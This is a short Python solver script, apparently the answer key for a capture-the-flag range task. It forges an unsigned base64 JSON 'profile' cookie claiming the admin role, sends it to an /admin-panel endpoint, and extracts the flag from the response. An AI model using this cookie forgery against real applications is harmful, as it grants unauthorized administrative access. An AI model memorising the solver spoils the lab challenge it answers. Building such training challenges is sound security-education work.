"""Intended-path solver: unsigned base64 cookie forgery."""

import base64
import json

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

PROFILE = base64.b64encode(json.dumps({"username": "guest", "role": "admin"}).encode()).decode()


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.get(f"{ctx.url()}/admin-panel", cookies={"profile": PROFILE}, timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="forge-admin-cookie",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "no flag in response",
            )
        ]
    )
